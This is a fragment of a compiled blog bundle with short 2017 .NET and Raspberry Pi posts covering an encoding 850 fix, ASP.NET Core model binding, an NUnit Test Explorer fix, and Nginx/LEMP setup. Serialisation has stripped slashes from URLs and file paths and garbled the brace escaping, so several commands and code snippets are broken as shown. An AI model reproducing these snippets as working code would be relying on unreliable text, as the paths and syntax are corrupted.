Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Resolving System.NotSupportedException No data is available for encoding 850 in .net Core","authors":["mark-burton"],"date":"2017-12-12","tags":[".NET Core","Encoding","EPPlus","NOPI","SharpZip"]},"unlisted":false,"prevItem":{"title":"Playing with Service Workers","permalink":"/docs/blog/Playing-with-Service-Workers"},"nextItem":{"title":"Job Interview Technical Test Preparation","permalink":"/docs/blog/Job-Interview-Technical-Test-Preparation"}},"content":"https:/msdn.microsoft.comen-uslibrarysystem.text.encodingprovider(v=vs.110).aspx  ```  Message: System.NotSupportedException : No data is available for encoding 850. For information on defining a custom encoding, see the documentation for the Encoding.RegisterProvider method.  ```  ```Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);"},{"id":"/Job-Interview-Technical-Test-Preparation","metadata":{"permalink":"/docs/blog/Job-Interview-Technical-Test-Preparation","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Job-Interview-Technical-Test-Preparation.md","source":"@site/blog/Job-Interview-Technical-Test-Preparation.md","title":"Job Interview Technical Test Preparation","description":"docs.microsoft.com  Apply to a controller action by specifying it in the signature public IActionResult EncodedName([ModelBinder(typeof(Base64StringBinder))] string name).  Apply to a model using [ModelBinder(BinderType = typeof(AuthorEntityBinder))]  and register in startup.cs","date":"2017-11-04T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":true,"label":"Custom Model Binding","permalink":"/docs/blog/tags/custom-model-binding"},{"inline":true,"label":"CQRS","permalink":"/docs/blog/tags/cqrs"},{"inline":true,"label":"Azure Service Bus","permalink":"/docs/blog/tags/azure-service-bus"},{"inline":true,"label":"AMQP","permalink":"/docs/blog/tags/amqp"}],"readingTime":1.79,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Job Interview Technical Test Preparation","authors":["mark-burton"],"date":"2017-11-04","tags":["ASP.NET Core","Custom Model Binding","CQRS","Azure Service Bus","AMQP"]},"unlisted":false,"prevItem":{"title":"Resolving System.NotSupportedException No data is available for encoding 850 in .net Core","permalink":"/docs/blog/NotSupportedException exception using Encoding in .net core"},"nextItem":{"title":"NUnit 3 Tests Are Not Showing In Visual Studio Test Explorer","permalink":"/docs/blog/Nunit-Tests-Not-Showing-In-Test-Explorer"}},"content":"[docs.microsoft.com](https:/docs.microsoft.comen-usaspnetcoremvcadvancedcustom-model-binding)  Apply to a controller action by specifying it in the signature `public IActionResult EncodedName([ModelBinder(typeof(Base64StringBinder))] string name)`.  Apply to a model using `[ModelBinder(BinderType = typeof(AuthorEntityBinder))]`  and register in startup.cs\\n``` csharp\\npublic void ConfigureServices(IServiceCollection services)  \\\\\\\\\\\\{  services.AddMvc(options =>  \\\\{  Insert at the top so this gets used before default binder  options.ModelBinderProviders.Insert(0, new AuthorEntityBinderProvider());  \\\\\\\\});  }\\n```  using a [model binder provider](https:/github.comaspnetDocstreemasteraspnetcoremvcadvancedcustom-model-bindingsampleCustomModelBindingSample)  ``` csharp\\npublic class AuthorEntityBinderProvider : IModelBinderProvider  \\\\\\\\\\\\{  if (context.Metadata.ModelType == typeof(Author))  \\\\{  return new BinderTypeModelBinder(typeof(AuthorEntityBinder));  \\\\\\\\}  return null;  }\\n```  ## Decode base64 string\\n``` csharp  string decodedJson = Encoding.UTF8.GetString(Convert.FromBase64String(value));\\n```\\n## Deserialise\\n[json convert](https:/www.newtonsoft.comjsonhelphtmlT_Newtonsoft_Json_JsonConvert.htm)\\n``` csharp  1 Product product = new Product();  2  3 product.Name = \\"Apple\\";  4 product.ExpiryDate = new DateTime(2008, 12, 28);  5 product.Price = 3.99M;  6 product.Sizes = new string[] \\\\\\\\{ \\"Small\\", \\"Medium\\", \\"Large\\" \\\\};  7  8 string output = JsonConvert.SerializeObject(product);  9 /\\\\\\\\{\\n10 //  \\"Name\\": \\"Apple\\",\\n11 //  \\"ExpiryDate\\": \\"2008-12-28T00:00:00\\",\\n12 //  \\"Price\\": 3.99,\\n13 //  \\"Sizes\\": [\\n14 //  \\"Small\\",\\n15 //  \\"Medium\\",\\n16 //  \\"Large\\"\\n17 //  ]\\n18 /\\\\}\\n19\\n20 Product deserializedProduct = JsonConvert.DeserializeObject<Product />(output);\\n```\\n[without netwonsoft](https:/msdn.microsoft.comen-uslibrarywindowsappssystem.runtime.serialization.json.datacontractjsonserializer(v=vs.105).aspx)\\n``` csharp  [DataContract]  public class Product  \\\\\\\\\\\\{  [DataMember]  public string Name \\\\{ get; set; \\\\\\\\}  [DataMember]  public DateTime ExpiryDate \\\\\\\\{ get; set; \\\\}  }  public static string WriteFromObject()  \\\\\\\\{  Product user = new Product(\\"Bob\\", DateTime.Now);  MemoryStream ms = new MemoryStream();  Serializer the User object to the stream.  DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(Product));  ser.WriteObject(ms, product);  byte[] json = ms.ToArray();  ms.Close();  return Encoding.UTF8.GetString(json, 0, json.Length);  \\\\}  public static User ReadToObject(string json)  \\\\\\\\{  Product deserializedProduct = new Product();  MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));  DataContractJsonSerializer ser = new DataContractJsonSerializer(deserializedUser.GetType());  deserializedUser = ser.ReadObject(ms) as Product;  \\\\}  ```  ##As a action filter\\ndecorate the controller action with [DecodingFilter]\\n```csharp  internal class DecodingFilterAttribute : Attribute, IActionFilter  \\\\\\\\\\\\{  public void OnActionExecuting(ActionExecutingContext context)  \\\\{  object param;  if (context.ActionArguments.TryGetValue(\\"name\\", out param))  {  context.ActionArguments[\\"name\\"] = Encoding.UTF8.GetString(Convert.FromBase64String(param.ToString()));  \\\\\\\\}  else  \\\\\\\\{  context.ActionArguments.Add(\\"name\\", \\"I come from action filter\\");  \\\\}  }  }\\n```  #CQRS\\n[Martin Fowler - Command Query Responsibility Segregation](https:/www.martinfowler.comblikiCQRS.html)  #Message queues  ##AMQP\\n[Azure Service Bus .NET Standard client library ](https:/www.nuget.orgpackagesMicrosoft.Azure.ServiceBus)\\n[Using Service Bus from .NET with AMQP 1.0](https:/docs.microsoft.comen-usazureservice-bus-messagingservice-bus-amqp-dotnet)  Void - Action<string /> prints = x => \\\\\\\\{ Debug.WriteLine(x); \\\\};  Returns - Func&lt;int, int, int&gt; add = (x, y) => \\\\\\\\{ return x + y; \\\\};"},{"id":"/Nunit-Tests-Not-Showing-In-Test-Explorer","metadata":{"permalink":"/docs/blog/Nunit-Tests-Not-Showing-In-Test-Explorer","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Nunit-Tests-Not-Showing-In-Test-Explorer.md","source":"@site/blog/Nunit-Tests-Not-Showing-In-Test-Explorer.md","title":"NUnit 3 Tests Are Not Showing In Visual Studio Test Explorer","description":"The message suggests that simply building the solution will fix this and the tests will appear in Test Explorer.  Regularly that has not been the outcome for me, the Test Explorer window remaining resolutely empty.","date":"2017-02-21T00:00:00.000Z","tags":[{"inline":true,"label":"NUnit","permalink":"/docs/blog/tags/n-unit"}],"readingTime":0.67,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"NUnit 3 Tests Are Not Showing In Visual Studio Test Explorer","authors":["mark-burton"],"date":"2017-02-21","tags":["NUnit"]},"unlisted":false,"prevItem":{"title":"Job Interview Technical Test Preparation","permalink":"/docs/blog/Job-Interview-Technical-Test-Preparation"},"nextItem":{"title":"Running ASP.NET Core on a RaspberryPi 2 with Nginx","permalink":"/docs/blog/Running ASP.NET Core on a RaspberryPi 2 with Nginx"}},"content":"<div className=\\"row\\" /><div /><div className=\\"col-xs-12 col-md-4\\" />![](/img/Empty Test%20Explorer.png)  <div />\\n<div />\\n<div className=\\"col-xs-12 col-md-8\\" />The message suggests that simply building the solution will fix this and the tests will appear in Test Explorer.  Regularly that has not been the outcome for me, the Test Explorer window remaining resolutely empty.\\n\\n<div />\\n<div />\\n<div />  <div className=\\"row\\" /><div /><div className=\\"col-xs-12 col-md-8\\" />To fix this it is necessary to open Tools ->Extensions and Updates...<div />\\n<div />\\n<div />\\n<div className=\\"col-xs-12 col-md-4\\" />![](/img/Tools Extensions%20and%20Updates%20Menu.png)  <div />\\n<div />\\n<div />  Search for NUnit to find the NUnit 3 Test Adapter\\n![](/img/Tools Extensions%20and%20Updates.png)  Click enable and restart Visual Studio, the tests now show correctly."},{"id":"/Running ASP.NET Core on a RaspberryPi 2 with Nginx","metadata":{"permalink":"/docs/blog/Running ASP.NET Core on a RaspberryPi 2 with Nginx","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Running ASP.NET Core on a RaspberryPi 2 with Nginx.md","source":"@site/blog/Running ASP.NET Core on a RaspberryPi 2 with Nginx.md","title":"Running ASP.NET Core on a RaspberryPi 2 with Nginx","description":"Failed to load \u2592\u2592\u2592, error cannot open shared object file: No such file or directory Failed to bind to CoreCLR at /varwwwPublishOutputlibcoreclr.so\'","date":"2017-02-21T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":true,"label":"RaspberryPi","permalink":"/docs/blog/tags/raspberry-pi"},{"inline":true,"label":"Nginx","permalink":"/docs/blog/tags/nginx"}],"readingTime":0.52,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Running ASP.NET Core on a RaspberryPi 2 with Nginx","authors":["mark-burton"],"date":"2017-02-21","tags":["ASP.NET Core","RaspberryPi","Nginx"]},"unlisted":false,"prevItem":{"title":"NUnit 3 Tests Are Not Showing In Visual Studio Test Explorer","permalink":"/docs/blog/Nunit-Tests-Not-Showing-In-Test-Explorer"},"nextItem":{"title":"Setting up a Raspberry Pi NGINX PHP MySQL LEMP Stack","permalink":"/docs/blog/Setting-Raspberry-Pi-NGINX-PHP-MySQL-LEMP-Stack"}},"content":"Failed to load \u2592\u2592\u2592, error: libunwind.so.8: cannot open shared object file: No such file or directory Failed to bind to CoreCLR at /varwwwPublishOutputlibcoreclr.so\'\\n```  # Permissions\\n`chmod 744?`  # Tell Kestrel to listen  If you are running headless you will need Kestrel to be listening for external requests to confirm the app is running, this can be done using the `ASPNETCORE_URLS environment variable`  ```perl  ASPNETCORE_URLS=\\"http:/*:5000\\" dotnet Your.App.dll\\n```  # Create the service file\\nadd a symlink for dotnet to limit the changes to the service file\\n```perl\\nsudo ln -s /optdotnetdotnet /usrbindotnet\\n```  # Configuring SSL\\nRather than building nginx from source to get SSL I used nginx-core."},{"id":"/Setting-Raspberry-Pi-NGINX-PHP-MySQL-LEMP-Stack","metadata":{"permalink":"/docs/blog/Setting-Raspberry-Pi-NGINX-PHP-MySQL-LEMP-Stack","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Setting-Raspberry-Pi-NGINX-PHP-MySQL-LEMP-Stack.md","source":"@site/blog/Setting-Raspberry-Pi-NGINX-PHP-MySQL-LEMP-Stack.md","title":"Setting up a Raspberry Pi NGINX PHP MySQL LEMP Stack","description":"Then check the version  `PERL","date":"2017-02-21T00:00:00.000Z","tags":[{"inline":true,"label":"Raspberry Pi","permalink":"/docs/blog/tags/raspberry-pi"},{"inline":false,"label":"NGINX","permalink":"/docs/blog/tags/nginx","description":"NGINX web server"},{"inline":true,"label":"PHP","permalink":"/docs/blog/tags/php"},{"inline":true,"label":"MySQL","permalink":"/docs/blog/tags/my-sql"},{"inline":true,"label":"LEMP","permalink":"/docs/blog/tags/lemp"}],"readingTime":1.17,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Setting up a Raspberry Pi NGINX PHP MySQL LEMP Stack","authors":["mark-burton"],"date":"2017-02-21","tags":["Raspberry Pi","NGINX","PHP","MySQL","LEMP"]},"unlisted":false,"prevItem":{"title":"Running ASP.NET Core on a RaspberryPi 2 with Nginx","permalink":"/docs/blog/Running ASP.NET Core on a RaspberryPi 2 with Nginx"}},"content":"```PERL\\nsudo apt-get install php-fpm\\n```\\nThen check the version  ```PERL\\n$ php -v\\n```\\nYou should see something like this\\n```PERL\\nPHP 7.0.16-1~bpo8+1 (cli) (built: Feb 18 2017 02:34:09) ( NTS )\\nCopyright (c) 1997-2017 The PHP Group\\nZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies  with Zend OPcache v7.0.16-1~bpo8+1, Copyright (c) 1999-2017, by Zend Technologies\\n```  Then use these instructions to [setup PHP with Nginx](https:/www.digitalocean.comcommunitytutorialshow-to-install-linux-nginx-mysql-php-lemp-stack-in-ubuntu-16-04)  Make sure to enable PHP in the Nginx config file, and ensure it is pointing to the correct location, for me that was\\n```PERL  location ~ \\\\.php$ \\\\\\\\\\\\{  include snippetsfastcgi-php.conf;  #  #  # With php5-cgi alone:  #  fastcgi_pass 127.0.0.1:9000;  #  # With php5-fpm:  fastcgi_pass unix:varrunphpphp7.0-fpm.sock;  \\\\\\\\}\\n```  restart Nginx to pick up the new configuration\\n```\\nsudo nginx -s reload\\n```\\nTest it with a simple php page using `&lt;?php phpinfo(); ?&gt;`  In order to serve extensionless html pages, update the try_files in the location block when setting up the sites-available server blocks config  ```PERL\\nlocation \\\\\\\\{  try_files $uri $uri.html $uri/ =404;  \\\\}\\n```  Install MySQL by following this tutorial again by  [Ste Wright - Install MySQL Server on you Respberry Pi](https:/www.stewright.me201604install-mysql-server-raspberry-pi)\\nYou should now have a working nginx server running PHP scripts, next time I will setup piwik so you can monitor the traffic to your website."}]}}')}}]);